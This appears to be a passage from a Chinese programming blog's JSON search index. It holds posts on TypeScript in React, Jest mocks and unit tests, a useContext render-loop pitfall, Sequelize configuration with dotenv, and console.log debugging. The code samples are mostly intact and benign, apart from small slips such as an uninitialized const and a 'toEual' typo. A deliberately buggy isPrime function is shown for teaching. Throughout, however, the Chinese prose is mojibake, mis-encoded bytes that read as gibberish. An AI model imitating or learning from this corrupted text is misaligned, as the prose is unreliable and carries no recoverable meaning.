name: string, isDone: boolean}// æ¥åˆ°çš„ functiontype LogMessage = (msg: string) =&gt; void;// å¯«å¥½æœƒæ¥æ”¶åˆ°çš„ propsinterface Props = { // 1. todoï¼Œä¸”å®ƒçš„ type æ˜¯ä¸Šé¢å®šç¾©å¥½çš„é‚£å€‹ todo: Todo, // 2. logMessageï¼ŒåŒä¸Š logMessage: LogMessage}const TodoItem: React.FC&lt;Props&gt; = ({ todo, logMessage }) =&gt; { return ( &lt;&gt; &lt;li&gt;{todo.name}&lt;/li&gt; &lt;button onClick={logMessage}&gt;log message&lt;/button&gt; &lt;/&gt; )} åœ¨ Component ä¸­å®šç¾©çš„ function / variable éƒ½è¦è¨˜å¾—çµ¦ type 1234567891011121314import React from \"react\";const TestCom: React.FC = () =&gt; { // è®Šæ•¸ const a: string; // å‡½å¼ï¼ˆåƒæ•¸ã€å›å‚³å€¼ï¼‰ const handleSomething = (value: string): void =&gt; { console.log(value); } return (&lt;h1&gt;Test Component&lt;/h1&gt;)}export default TestCom é—œæ–¼ Event çš„ type å¦‚æœæ˜¯ inline function çš„è©±å¯ä»¥ä¸ç”¨å¹« event åŠ ä¸Š typeï¼š 12345678910111213export const AddTodoFrom: React.FC&lt;Props&gt; = ({ addTodo }) =&gt; { const [value, setValue] = useState(\"\"); return ( &lt;form onSubmit={e =&gt; { e.preventDefault(); addTodo(value); setValue(\"\"); }}&gt; &lt;input type=\"text\" value={value} onChange={e =&gt; setValue(e.target.value)} /&gt; &lt;/form&gt; )} å¯æ˜¯å¦‚æœä¸æ˜¯çš„è©±ï¼Œå°±è¦ç”¨é€™ç¨®å½¢å¼ä¾†ä»£è¡¨ï¼š 123456789101112131415export const AddTodoFrom: React.FC&lt;Props&gt; = ({ addTodo }) =&gt; { const [value, setValue] = useState(\"\"); // æŒ‡å®š type const handleSubmit = (e: React.FormEvent&lt;HTMLFormElement&gt;) =&gt; { e.preventDefault(); addTodo(value); setValue(\"\"); } return ( &lt;form onSubmit={handleSubmit}&gt; &lt;input type=\"text\" value={value} onChange={e =&gt; setValue(e.target.value)} /&gt; &lt;/form&gt; )}","link":"/2022/05/11/typescript-review/"},{"title":"ä¸€å€‹åš Unit test å¯èƒ½æœƒç”¨åˆ°çš„æ–¹æ³•","text":"åšä½œæ¥­æ™‚å­¸åˆ°çš„ï¼Œæ‰€ä»¥æƒ³è¨˜ä¸€ä¸‹ã€‚ ç°¡è¿° SUT èˆ‡ DOCé€™é‚Šå…ˆä»‹ç´¹å…©å€‹å°ˆæœ‰åè©ï¼š SUTï¼ˆSystem Under Testï¼‰ DOCï¼ˆDepended-on Componentï¼‰ ç°¡å–®ä¾†èªª SUT å¯ä»¥æƒ³æˆæ˜¯çœŸæ­£è¦æ¸¬è©¦çš„ã€Œç›®æ¨™ã€ï¼Œè€Œ DOC å‰‡æ˜¯ç”¨ä¾†ã€Œå”åŠ©ç›®æ¨™ã€çš„å…¶ä»–æ±è¥¿ã€‚ é€™æ¨£è¬›å¯èƒ½æœ‰é»æŠ½è±¡ï¼Œæ‰€ä»¥ç›´æ¥ä¾†èˆ‰å€‹ä¾‹å­ï¼š 123456function forEach(array, callback) { for (const item of array) { callback(item) }}module.exports = forEach å°±æ˜¯ä¸€å€‹ç°¡å–®çš„ forEachã€‚ é€™æ™‚å€™æˆ‘å€‘å¯èƒ½æœƒæƒ³æ¸¬è©¦ forEach çš„é‹ä½œæ˜¯å¦æ­£å¸¸ï¼Œä¸éå®ƒé¡¯ç„¶éœ€è¦ä¸€å€‹ callback ä¾†è¼”åŠ©åŸ·è¡Œã€‚é€™æ™‚å€™å°±å¯ä»¥æŠŠ forEach ç•¶ä½œæ˜¯ SUTï¼Œè€Œ callback å‰‡æ˜¯ DOCã€‚ ç‚ºä»€éº¼è¦é€™æ¨£åˆ†ï¼Ÿå› ç‚ºæˆ‘å€‘å…¶å¯¦çœŸæ­£æƒ³æ¸¬è©¦çš„æ˜¯ forEachï¼Œä¸æ˜¯ callbackï¼Œä½†å¦‚æœ callback å‡ºäº†ä¸€é»å•é¡Œå¯èƒ½å°±æœƒé€£å¸¶å½±éŸ¿åˆ° forEach çš„çµæœï¼Œé€™æ¨£ä¸æ˜¯å¾ˆå¥½ã€‚ æ‰€ä»¥æ‰æœƒåˆ©ç”¨é€™ç¨®æ–¹å¼ä¾†åˆ‡å‰²å‡ºã€Œæœ€å°å–®ä½ã€ï¼Œè®“ A è·Ÿ B ä¹‹é–“ä¸è¦äº’ç›¸å½±éŸ¿ã€‚ mock function æ›¿èº«å‡½å¼å‰é¢çš„èˆ–é™³å°±æ˜¯ç‚ºäº†ä»‹ç´¹ã€ŒMockã€é€™å€‹æ±è¥¿ã€‚ Mock çš„ä¸­æ–‡ç¿»ä½œã€Œæ¨¡æ“¬ã€æ¨¡ä»¿ã€ï¼Œåœ¨ Unit test è£¡é¢æˆ‘å€‘æœƒæŠŠ Mock æƒ³æˆæ˜¯ä¸€ç¨®ã€Œæ›¿èº«å‡½å¼ã€ã€‚è—‰ç”±é€™å€‹æ›¿èº«å‡½å¼ä¾†å”åŠ©æˆ‘å€‘çœŸæ­£æƒ³æ¸¬è©¦çš„ functionã€‚ ä»¥ä¸Šé¢ forEach çš„ä¾‹å­ä¾†èªªï¼Œæˆ‘å€‘å°±æœƒç”Ÿä¸€å€‹ Mock å‡ºä¾†ï¼Œç•¶ä½œ callback çš„æ›¿èº«ã€‚ é€™é‚Šä¸æœƒè¬›å¤ªæ·±ï¼Œåªæœƒç´€éŒ„ä¸€ä¸‹æˆ‘ç›®å‰å­¸åˆ°çš„ç”¨æ³•ï¼Œæƒ³çŸ¥é“æ›´å¤šå¯ä»¥åƒè€ƒ å®˜æ–¹æ–‡ä»¶ã€‚ ç¸½ä¹‹å‘¢ï¼Œåœ¨å¯¦éš›æ‡‰ç”¨ä»¥å‰ï¼Œå…ˆä»‹ç´¹ä¸€ä¸‹åœ¨ jest è£¡ä½¿ç”¨ Mock çš„åŸºæœ¬ç”¨æ³•ã€‚ é–‹å•Ÿæ–¹å¼jest.fn() 123456it('should return undefined', () =&gt; { // å»ºç«‹ä¸€å€‹ Mock const mockFunction = jest.fn() // é è¨­çš„å›å‚³å€¼ç‚º undefinedï¼Œå°±è·Ÿ call ä¸€èˆ¬çš„ function ä¸€æ¨£ expect(mockFunction()).toBe(undefined)}) æŒ‡å®šå›å‚³å€¼ mockReturnValueOnce ä¸€æ¬¡ mockReturnValue æ°¸é  1234567891011121314151617181920212223242526272829303132333435it('should return true only in first call', () =&gt; { const mockFunction = jest.fn() // åªæœ‰ç¬¬ä¸€æ¬¡ call æœƒå›å‚³ true mockFunction.mockReturnValueOnce(true) expect(mockFunction()).toBe(true) expect(mockFunction()).toBe(undefined) expect(mockFunction()).toBe(undefined) expect(mockFunction()).toBe(undefined)})it('should always return true', () =&gt; { const mockFunction = jest.fn() // åªæœ‰ç¬¬ä¸€æ¬¡ call æœƒå›å‚³ true mockFunction.mockReturnValue(true) expect(mockFunction()).toBe(true) expect(mockFunction()).toBe(true) expect(mockFunction()).toBe(true) expect(mockFunction()).toBe(true)})it('should return true, false, false and true', () =&gt; { const mockFunction = jest.fn() // ç¬¬ä¸€æ¬¡å›å‚³ true // ç¬¬äºŒæ¬¡å›å‚³ false // ç¬¬ä¸‰æ¬¡å›å‚³ false // ç¬¬å››æ¬¡å›å‚³ true mockFunction .mockReturnValueOnce(true) .mockReturnValueOnce(false) .mockReturnValueOnce(false) .mockReturnValueOnce(true) expect(mockFunction()).toBe(true) expect(mockFunction()).toBe(false) expect(mockFunction()).toBe(false) expect(mockFunction()).toBe(true)}) Mock çš„å¯¦éš›æ‡‰ç”¨æª¢æŸ¥ Mock è¢« call äº†å¹¾æ¬¡mockFunction.mock.calls.length 1234567it('mock function should be call two times', () =&gt; { // æŠŠé€™å€‹ mock ç•¶æˆ callback const mockFunction = jest.fn((x) =&gt; x + 1) forEach([1, 2, 3], mockFunction) // mock æ‡‰è©²è¦è¢«åŸ·è¡Œä¸‰æ¬¡ expect(mockFunction.mock.calls.length).toBe(3)}) æª¢æŸ¥ Mock æ˜¯æ€éº¼è¢«å‘¼å«çš„toHaveBeenCalledWith 1234567it('mock function should be call with an argument', () =&gt; { const mockFunction = jest.fn((x) =&gt; x + 1) forEach(['A'], mockFunction) // å¯ä»¥æƒ³æˆæ˜¯é€™æ¨£ï¼šmock.call(this, 'A') // å°±æ˜¯ mock æ˜¯æ€éº¼è¢«å‘¼å«çš„æ„æ€ expect(mockFunction).toHaveBeenCalledWith('A')}) æª¢æŸ¥ Mock æ¯ä¸€æ¬¡æ˜¯æ€éº¼è¢«å‘¼å«çš„toHaveBeenNthCalledWith 12345678it('mock function should be call with each element', () =&gt; { const mockFunction = jest.fn((x) =&gt; x + 1) forEach(['A', 'B', 'C'], mockFunction) // mock çš„æ¯ä¸€æ¬¡æ˜¯æ€éº¼è¢« call çš„ expect(mockFunction).toHaveBeenNthCalledWith(1, 'A') expect(mockFunction).toHaveBeenNthCalledWith(2, 'B') expect(mockFunction).toHaveBeenNthCalledWith(3, 'C')}) æª¢æŸ¥ Mock è¢«å‘¼å«æ™‚çš„åƒæ•¸è³‡è¨Š123456789101112131415161718192021it('mock function should be call with each element', () =&gt; { const mockFunction = jest.fn() const array = [ { name: 'PeaNu', age: 20 }, { name: 'PPB', age: 18 }, { name: 'ET', age: 100 } ] forEach(array, mockFunction) // calls[0]: ç¬¬ä¸€æ¬¡åŸ·è¡Œçš„åƒæ•¸è³‡æ–™ // calls[0][0]: ç¬¬ä¸€æ¬¡åŸ·è¡Œçš„ç¬¬ä¸€å€‹åƒæ•¸ // calls[0][0]['name']: ç¬¬ä¸€æ¬¡åŸ·è¡Œçš„ç¬¬ä¸€å€‹åƒæ•¸çš„ name å±¬æ€§ expect(mockFunction.mock.calls[0][0]['name']).toBe('PeaNu') expect(mockFunction.mock.calls[0][0]['age']).toBe(20) expect(mockFunction.mock.calls[1][0]['name']).toBe('PPB') expect(mockFunction.mock.calls[1][0]['age']).toBe(18) expect(mockFunction.mock.calls[2][0]['name']).toBe('ET') expect(mockFunction.mock.calls[2][0]['age']).toBe(100)})","link":"/2022/03/22/unit-test-methods/"},{"title":"ç¬¬ä¸€æ¬¡åš Unit test","text":"å¥½åƒå¾ˆå²å®³çš„æ„Ÿè¦ºã€‚ å–®å…ƒæ¸¬è©¦åœ¨åšä»€éº¼ï¼Ÿå–®å…ƒæ¸¬è©¦ä¹Ÿå¯ä»¥ç¨±ç‚ºã€Œæ¨¡çµ„æ¸¬è©¦ã€ã€‚ ä¸€å€‹ç¨‹å¼å¯ä»¥åŠƒåˆ†æˆå¾ˆå¤šå€‹å°å–®ä½ï¼Œfunction å°±æ˜¯å…¶ä¸­ä¹‹ä¸€ã€‚ è€Œ unit test è¦åšçš„äº‹æƒ…æ˜¯ï¼Œæ¸¬è©¦æ¯ä¸€å€‹ function çš„æ­£ç¢ºæ€§ï¼Œä¸¦ç¢ºä¿æ¯ä¸€å€‹å°çš„å–®ä½ï¼ˆunitï¼‰éƒ½æ²’æœ‰éŒ¯ã€‚ å¦å¤–ï¼Œé€™ç¯‡ç­†è¨˜çš„å…§å®¹æ˜¯ä»¥ jest ä¾†åšæ¸¬è©¦ã€‚ åŸºæœ¬ç”¨æ³•Step1 æŠŠä½ è¦æ¸¬è©¦çš„ function çµ¦è¼¸å‡º12345678910// index.jsfunction repeat(str, times) { let result = '' for (let i = 0; i &lt; times; i++) { result += str } return result}// è¼¸å‡ºæ¨¡çµ„module.exports = repeat ç°¡å–®ä¾†èªªï¼Œé€™å€‹ function çš„å›å‚³å€¼æ˜¯ã€Œn å€‹æ–°å­—ä¸²ã€ Step2 å»ºç«‹ index.test.js æ¸¬è©¦åŸ·è¡Œæª”ä¸€èˆ¬æ¸¬è©¦åŸ·è¡Œæª”éƒ½æœƒæŠŠ .test.js ç•¶åšå¾Œç¶´æª”åã€‚å¯ä»¥ç®—æ˜¯å€‹ç´„å®šä¿—æˆï¼Œç›¡é‡ç¶­æŒé€™å€‹ç¿’ä¿—ã€‚ å¦å¤–å¦‚æœä½ å‰›å¥½ä¹Ÿæœ‰æª”æ¡ˆå« test.js çš„è©±ï¼Œæœƒè¢«èª¤ä»¥ç‚ºæ˜¯æ¸¬è©¦åŸ·è¡Œæª”è€Œä¸€èµ·è¢«åŸ·è¡Œï¼Œè¦å¤šæ³¨æ„ã€‚ Step3 æ’°å¯«æ¸¬è©¦å…§å®¹æœ‰ä¸æ‡‚çš„å°±åƒè€ƒ README ä¸Šçš„èªªæ˜ï¼Œé€™è£¡å°±ç°¡å–®ç¤ºç¯„ä¸€ä¸‹ï¼š 1234567891011121314151617// index.test.jsconst repeat = require('./repeat') // å¼•å…¥è¦æ¸¬è©¦çš„æ¨¡çµ„describe('æ¸¬è©¦ repeat', () =&gt; { test('çµæœæ‡‰è©²è¦æ˜¯ aaaaa', () =&gt; { expect(repeat('a', 5)).toBe('aaaaa') }) test('çµæœæ‡‰è©²è¦æ˜¯ \"\"', () =&gt; { expect(repeat('a', 0)).toBe('') }) test('çµæœæ‡‰è©²è¦æ˜¯ abcabc', () =&gt; { expect(repeat('abc', 2)).toBe('abcabc') }) test('çµæœæ‡‰è©²è¦æ˜¯ \"\"', () =&gt; { expect(repeat('', 5)).toBe('') })}) describe(message, function) æ˜¯ç”¨ä¾†æŠŠä¸€å€‹è¦æ¸¬è©¦çš„ç¾¤çµ„çµ¦åŒ…èµ·ä¾†ï¼Œé€™æ¨£åœ¨çµæ§‹ä¸Šæœƒæ¯”è¼ƒå¥½ã€‚message å¯ä»¥å¡«å…¥è·Ÿé€™å€‹ç¾¤çµ„æœ‰é—œçš„åç¨±ï¼Œfunction è£¡é¢æœƒæ”¾è¦æ¸¬è©¦çš„æ‰€æœ‰é …ç›®ã€‚ test(message, function) æ˜¯ç”¨ä¾†åŸ·è¡Œæ¸¬è©¦å‡½å¼ï¼Œmessage å¯ä»¥å¡«å…¥é€™å€‹å‡½å¼è¦æ¸¬è©¦ä»€éº¼ï¼Ÿ expect(received).toBe(expected) received æ”¾ä½ è¦åŸ·è¡Œçš„å‡½å¼ï¼Œexpected å¡«é æœŸçš„è¼¸å‡ºçµæœã€‚ Step4 åŸ·è¡Œæ¸¬è©¦åŸ·è¡Œæª”ç‰¹åˆ¥æ³¨æ„ï¼Œå› ç‚º jest æ˜¯å®‰è£åœ¨å°ˆæ¡ˆåº•ä¸‹ï¼Œæ‰€ä»¥æ²’è¾¦æ³•ç›´æ¥åœ¨ terminal ä¸Šç”¨é€™å€‹æŒ‡ä»¤ï¼Œå¿…é ˆé€é npm script æˆ– npx jest ä¾†åŸ·è¡Œï¼Œè©³ç´°å¯ä»¥åƒè€ƒ npm script èˆ‡ npx çš„ç”¨é€”ã€‚ æˆåŠŸåŸ·è¡Œå¾Œå°±èƒ½çœ‹åˆ°çµæœå¦‚ä¸‹ï¼š å¦‚æœæœ‰ç™¼ç¾éŒ¯èª¤çš„çµæœï¼š è£œå……ç•¶æƒ³è¦æª¢æŸ¥çš„å€¼æ˜¯é™£åˆ— or ç‰©ä»¶çš„è©±ï¼Œè¦æ”¹ç”¨ toEual ä¸æ˜¯ toBeã€‚é€™æ¨£å°±æœƒæª¢æŸ¥è£¡é¢çš„æ¯ä¸€å€‹å€¼æ˜¯å¦ç›¸åŒï¼Œè€Œä¸æ˜¯æª¢æŸ¥è¨˜æ†¶é«”ä½ç½®ã€‚ 1234567// myFunction æœƒå›å‚³ [1, 2, 3]const myFunction = require('./myfunction')describe('è¤‡ç¿’ jest', () =&gt; { test('is array === [1, 2, 3] ?', () =&gt; { expect(myFunction()).toBe([1, 2, 3]) })}) æ”¹æˆ toEqual å°±æ­£ç¢ºäº†ï¼š 1234567// myFunction æœƒå›å‚³ [1, 2, 3]const myFunction = require('./myfunction')describe('è¤‡ç¿’ jest', () =&gt; { test('is array === [1, 2, 3] ?', () =&gt; { expect(myFunction()).toEqual([1, 2, 3]) })}) ç¸½çµç¬¬ä¸€æ¬¡å¯«å–®å…ƒæ¸¬è©¦é‚„è »æœ‰è¶£çš„ï¼Œä»¥å‰ä¹Ÿæ˜¯å¾ˆå¸¸è½åˆ° unit test é€™å€‹æŠ€è¡“ç”¨èªï¼Œä½†éƒ½ä¸çŸ¥é“å¯¦éš›ä¸Šåœ¨åšä»€éº¼ï¼Œä»Šå¤©ç®—æ˜¯è§£æ±ºé€™å€‹ç–‘æƒ‘äº†ï¼Œä¹Ÿå­¸åˆ°ä¸€é …æ–°çš„æŠ€èƒ½ï¼Œé–‹å¿ƒï¼","link":"/2021/12/24/unit-test/"},{"title":"ä½¿ç”¨ useContext è¦æ³¨æ„çš„ç´°ç¯€","text":"éš”äº†ä¸€å¤©æ‰ææ¸…æ¥šã€‚ ç°¡è¿°ç•¶æ™‚çš„æƒ…å¢ƒæ˜¯æˆ‘æƒ³åœ¨ App åŒ…è£¹ä¸€å±¤ &lt;Loading.Provider&gt;ï¼Œæ¥è‘—å†é€éå­å…ƒä»¶å»å‘¼å« setIsLoading ä¾†æ›´æ–° stateï¼Œåƒé€™æ¨£ï¼š 12345678910111213141516171819202122232425262728293031const [isLoading, setIsloading] = useState(false);return ( &lt;ThemeProvider theme={theme}&gt; &lt;GlobalStyle /&gt; {/* loading context */} &lt;Loading.Provider value={[isLoading, setIsloading]}&gt; &lt;AuthContext.Provider value={{ user, setUser }}&gt; &lt;Router&gt; &lt;NavBar /&gt; &lt;Routes&gt; &lt;Route path=\"/\" element={&lt;HomePage /&gt;} /&gt; &lt;Route path=\"/about\" element={&lt;AboutPage /&gt;} /&gt; &lt;Route path=\"/categories\" element={&lt;CategoriesPage /&gt;} /&gt; &lt;Route path=\"/posts\" element={&lt;PostsPage /&gt;} /&gt; &lt;Route path=\"/posts/:id\" element={&lt;SinglePostPage /&gt;} /&gt; &lt;Route path=\"/log-in\" element={&lt;LoginPage /&gt;} /&gt; &lt;Route path=\"/sign-up\" element={&lt;SignUpPage /&gt;} /&gt; &lt;Route path=\"/test\" element={&lt;TestPage /&gt;} /&gt; &lt;/Routes&gt; {/* loading component */} &lt;StyledLoader active={isLoading} spinner={true} text=\"Loading your content...\" &gt;&lt;/StyledLoader&gt; &lt;/Router&gt; &lt;/AuthContext.Provider&gt; &lt;/Loading.Provider&gt; &lt;/ThemeProvider&gt;) æ¥è‘—æˆ‘åœ¨å­å…ƒä»¶è£¡é¢é€™æ¨£å¯«ï¼š 123456789101112131415161718export default function HomePage() { const [isLoading, setIsLoading] =useContext(Loading) const [posts, setPosts] = useState([]); // ä¸€é€²ä¾†å°±æ‰“é–‹ loading ç•«é¢ setIsLoading(true); useEffect(() =&gt; { getAllPosts().then((data) =&gt; { setPosts(data); // æ‹¿åˆ° API è³‡æ–™å¾Œå†é—œé–‰ setIsLoading(false); }); }, [setIsLoading]); // ... ç•¥} æ¥è‘—å°±å™´éŒ¯èª¤äº†ï¼š Warning çš„å¤§æ„æ˜¯èªªæˆ‘ä¸æ‡‰è©²åœ¨ render å­å…ƒä»¶çš„æ™‚å€™å»æ›´æ–° stateã€‚æˆ‘ä¸€é–‹å§‹æ²’æœ‰å¾ˆæ‡‚é€™ä»€éº¼æ„æ€ï¼Œä¸éå¾Œä¾†ä»”ç´°æƒ³ä¸€ä¸‹æµç¨‹å¾Œå°±æ˜ç™½äº†ã€‚ ç¸½ä¹‹é€™æ˜¯å› ç‚ºæˆ‘åœ¨ render å­å…ƒä»¶çš„æ™‚å€™å»æ›´æ–°äº† stateï¼Œé€™æ™‚å€™å°±æœƒè§¸ç™¼ App é‡æ–° renderï¼Œç„¶å¾Œ render å­å…ƒä»¶çš„æ™‚å€™åˆå†æ›´æ–°äº† stateï¼Œè§¸ç™¼ App é‡æ–° render â€¦ å¤§æ¦‚å°±è·Ÿé€™å¼µåœ–çš„æ„æ€ä¸€æ¨£ï¼š æ‰€ä»¥è¦é¿é–‹é€™ç¨®ï¼š åœ¨ render æ™‚æ›´æ–° state çš„è¡Œç‚º åœ¨ render æ™‚æ›´æ–° state çš„è¡Œç‚º åœ¨ render æ™‚æ›´æ–° state çš„è¡Œç‚º é€™å€‹çœŸçš„å¾ˆé‡è¦QQï¼Œè«‹å‹™å¿…ææ¸…æ¥šã€‚ æœ€å¾Œå‘¢ï¼Œé€™å€‹ç¯„ä¾‹çš„æ­£ç¢ºåšæ³•æ‡‰è©²æ˜¯é€™æ¨£ï¼š 12345678useEffect(() =&gt; { // ç•¶ render å®Œä»¥å¾Œæ‰åŸ·è¡Œã€‚ setIsLoading(true); getAllPosts().then((data) =&gt; { setPosts(data); setIsLoading(false); });}, [setIsLoading]); // åªæœ‰åœ¨ setIsLoading æ”¹è®Šæ™‚ï¼Œé€™å€‹ Effect æ‰æœƒå†æ¬¡åŸ·è¡Œ å¸Œæœ›ä»¥å¾Œåˆ¥å†è¸©åˆ°åŒæ¨£çš„é›·ã€‚","link":"/2022/04/12/use-context-problem/"},{"title":"åœ¨ Seuqelize ä¸­ä½¿ç”¨ç’°å¢ƒè®Šæ•¸çš„æ–¹å¼","text":"åªæ˜¯å€‹è¨­å®šï¼Œä½†å»è¸©äº†ä¸å°‘é›·ã€‚ ç°¡è¿°é¦–å…ˆä¾†çœ‹ä¸€ä¸‹ å®˜æ–¹çš„æ•™å­¸ æ˜¯æ€éº¼èªªçš„ï¼š This is a special configuration file. It lets you specify the following options that you would usually pass as arguments to CLI: Some scenarios where you can use it: You want to override default path to migrations, models, seeders or config folder. You want to rename config.json to something else like database.json And a whole lot more. Letâ€™s see how you can use this file for custom configuration. To begin, letâ€™s create the .sequelizerc file in the root directory of your project, with the following content: 123456789// .sequelizercconst path = require('path');module.exports = { 'config': path.resolve('config', 'database.json'), 'models-path': path.resolve('db', 'models'), 'seeders-path': path.resolve('db', 'seeders'), 'migrations-path': path.resolve('db', 'migrations')}; With this config you are telling the CLI to: Use config/database.json file for config settings; Use db/models as models folder; Use db/seeders as seeders folder; Use db/migrations as migrations folder. OKï¼Œç°¡å–®ä¾†èªªå°±æ˜¯åœ¨ä½ çš„å°ˆæ¡ˆæ ¹ç›®éŒ„å¯«ä¸€å€‹ .sequelizerc çš„è¨­å®šæª”ï¼Œè£¡é¢å¯ä»¥æŒ‡å®š config / model å’Œ seed çš„è·¯å¾‘ä½ç½®ã€‚ ä½†æˆ‘è©¦éäº†ï¼Œæ²’æœ‰ç”¨å°±æ˜¯æ²’æœ‰ç”¨ã€‚ æˆ‘çˆ¬é Stackoverflow ä¹Ÿçˆ¬é GitHub issueï¼Œæœ‰äººèªªè¦æŠŠ .sequelizerc æ”¾åœ¨ã€Œä¸æ˜¯æ ¹ç›®éŒ„çš„ä½ç½®ã€æ‰è®€çš„åˆ°ï¼Œé€™å€‹æˆ‘ä¹Ÿè©¦éï¼Œä¸€æ¨£æ²’æ•ˆã€‚æ‰€ä»¥ç­‰ä¸€ä¸‹æœƒè§£é‡‹æˆ‘æœ€å¾Œæ˜¯æ€éº¼è§£æ±ºçš„ã€‚ çœŸæ­£çš„è§£æ³•é¦–å…ˆç¬¬ä¸€æ­¥æ˜¯å…ˆå»æ”¹å¯«åŸæœ¬ç”¨ sequelize-cli init å¾Œç”¢ç”Ÿçš„ config.jsonã€‚ æ”¹é€™å€‹æ˜¯å› ç‚ºæˆ‘å€‘å¸Œæœ›åœ¨è£¡é¢ä½¿ç”¨ç’°å¢ƒè®Šæ•¸ï¼Œä½† JSON åªèƒ½å¯«ç´”æ–‡å­—æ²’è¾¦æ³•å¯«è®Šæ•¸ï¼Œæ‰€ä»¥å¾—å…ˆæŠŠå®ƒè®Šæˆ config.jsï¼Œå†æ­é… dotenv ä¾†ä½¿ç”¨ã€‚ç¸½è€Œè¨€ä¹‹ï¼Œå¯«å¥½çš„å…§å®¹å¤§æ¦‚æœƒæ˜¯é€™æ¨£ï¼š 12345678910111213141516171819202122232425262728// config/json -&gt; config.jsrequire('dotenv').config(); // &lt;- è¨˜å¾—ä¸€å®šè¦å¼•å…¥ï¼Œä¸ç„¶ä½ æ²’è¾¦æ³•ç”¨module.exports = { \"development\": { \"username\": process.env.DB_USERNAME, // æ–¹æ³•ä¸€ \"password\": process.env.DB_PASSWORD, // æ–¹æ³•ä¸€ \"database\": process.env.DB_DATABASE, // æ–¹æ³•ä¸€ \"host\": \"127.0.0.1\", \"dialect\": \"mysql\", \"use_env_variable\": \"DB_URL\" // æ–¹æ³•äºŒ }, \"test\": { \"username\": \"root\", \"password\": null, \"database\": \"database_test\", \"host\": \"127.0.0.1\", \"dialect\": \"mysql\" }, \"production\": { \"username\": \"root\", \"password\": null, \"database\": \"database_production\", \"host\": \"127.0.0.1\", \"dialect\": \"mysql\" }} å¦‚æœæœ‰å°ˆå¿ƒçœ‹è¨»è§£æ‡‰è©²å°±æœƒæ³¨æ„åˆ°æœ‰å…©ç¨®å¯«æ³•ï¼Œç¬¬ä¸€ç¨®æ˜¯æŠŠè³‡æ–™åˆ†åˆ¥å¡«å…¥åˆ°æ¯å€‹æ¬„ä½ï¼Œç¬¬äºŒç¨®æ˜¯é€é use_env_variableï¼ˆSequelize æä¾›çš„å¦ä¸€ç¨®æ ¼å¼ï¼‰ä¾†è¨­å®šã€‚é€™å…©ç¨®æˆ‘æ¸¬è©¦çµæœéƒ½æ˜¯ OK çš„ï¼Œæ‰€ä»¥çœ‹ä½ å–œæ­¡ç”¨å“ªå€‹å°±ç”¨å“ªå€‹å§ã€‚ ä¸éç‰¹åˆ¥å¼·èª¿ä¸€ä¸‹ï¼Œuse_env_variable è¦å¡«å…¥çš„å€¼æ˜¯ã€Œç’°å¢ƒè®Šæ•¸çš„åç¨±ã€ï¼Œä¸æ˜¯ã€Œä½ æƒ³å‚³å…¥çš„å€¼ã€ã€‚é€™å€‹è¦ææ¸…æ¥šï¼Œä¸è¦åƒæˆ‘ä¸€æ¨£å‚»å‚»çš„ã€‚ æ¥ä¸‹ä¾†æ˜¯ä¸‹ä¸€å€‹æ­¥é©Ÿï¼Œå¦‚æœæŒ‰ç…§å‰›å‰›çš„å®˜æ–¹èªªæ˜ä½ å¾—å»æ–°å»ºä¸€å€‹ .sequelizerc ç„¶å¾Œè¨­å®š config å»è®€å–å‰›å‰›å¯«å¥½çš„ config.jsï¼Œä¸éæˆ‘ä¸€é–‹å§‹èªªéäº†é€™å°æˆ‘ç„¡æ•ˆã€‚ æˆ‘çš„åšæ³•æ˜¯ç›´æ¥åˆ° ./models/index.js æ”¹å…§å®¹ï¼š 123456789'use strict';const fs = require('fs');const path = require('path');const Sequelize = require('sequelize');const basename = path.basename(__filename);const env = process.env.NODE_ENV || 'development';// åŸæœ¬æ˜¯å¼•å…¥ config.jsonï¼Œç›´æ¥æ”¹æˆ config.jsconst config = require(__dirname + '/../config/config.js')[env]; ç•¶æ™‚ç‚ºäº†ç ”ç©¶é€™æ±è¥¿é‚„ç‰¹åœ°èŠ±æ™‚é–“çœ‹ä¸€ä¸‹é€™æ•´æ®µ code æ˜¯åœ¨å¹¹å˜›ç”¨çš„ï¼Œæœ‰èˆˆè¶£çŸ¥é“çš„è©±å¯ä»¥åƒè€ƒé€™ç¯‡ï¼šå¾è§£è®€ Sequelize çš„åŸ·è¡Œæª”ä¾†å­¸ç¿’ Node.js çš„æª”æ¡ˆç›¸é—œ API ç¸½è€Œè¨€ä¹‹ï¼ŒæŠŠé€™å€‹è·¯å¾‘æŒ‡å‘ä½ çš„è¨­å®šæª”å°±å¥½äº†ã€‚å¦‚æœè®€å–ä¸åˆ°é€šå¸¸æ˜¯ä½ è·¯å¾‘å¯«éŒ¯äº†ï¼Œå¯ä»¥ç”¨ console å°å‡ºä¾†æª¢æŸ¥çœ‹çœ‹ã€‚ æ²’æ„å¤–çš„è©±ï¼Œåˆ°é€™ä¸€æ­¥å°±å…¨éƒ¨è¨­å®šå¥½äº†ï¼Œæ­å–œæ­å–œã€‚","link":"/2022/04/03/use-env-in-seuqelize/"},{"title":"å–„ç”¨ console.log ä¾†é™¤éŒ¯","text":"æœ€ç°¡å–®åˆæš´åŠ›çš„æ–¹å¼ã€‚ åŠ  log çš„çœ‰è§’ï¼Ÿä¸€èˆ¬æœƒæŠŠ log åŠ åœ¨ä½ è¦ºå¾—ã€Œæœ€æœ‰å¯èƒ½å‡ºå•é¡Œçš„åœ°æ–¹ã€ï¼Œä½†å¦‚æœä¸€æ™‚æƒ³ä¸åˆ°è©²åŠ åœ¨å“ªè£¡ï¼Œæœ‰ä¸€å€‹æœ€ç°¡å–®çš„æ–¹å¼ï¼šé€šé€šçµ¦ä»–åŠ çˆ†ã€‚ æŠŠä½ æƒ³è¦å¾—åˆ°çš„è³‡è¨Šéƒ½çµ¦ log å‡ºä¾†ï¼Œåƒæ˜¯ è¿´åœˆæ¬¡æ•¸ï¼Œè®Šæ•¸å€¼ï¼Œé€²å…¥çš„æ¢ä»¶åˆ¤æ–· ç­‰ç­‰ä¹‹é¡ã€‚ æ¡ˆä¾‹ä¸€ä»¥ä¸‹æ˜¯ä¸€å€‹åˆ¤æ–·è³ªæ•¸çš„å‡½å¼ï¼Œä½†å› ç‚ºé‚è¼¯ä¸æ­£ç¢ºï¼Œæ‰€ä»¥æœƒå¾—åˆ°éŒ¯èª¤çš„çµæœï¼š 123456789101112function isPrime(num) { if (num === 1) return false if (num === 2) return true for(var i=2; i&lt;num; i++) { if(num % i === 0) { return false } else { return true } }}console.log(isPrime(25)) // true ç‚ºäº†é‡æ¸…å•é¡Œï¼Œå¯ä»¥å–„ç”¨ log ä¾†æª¢æŸ¥ï¼š 12345678910111213141516function isPrime(num) { console.log('num:', num) if (num === 1) return false if (num === 2) return true for(var i=2; i&lt;num; i++) { console.log('i:', i) if(num % i === 0) { console.log('num % i === 0', num, i) return false } 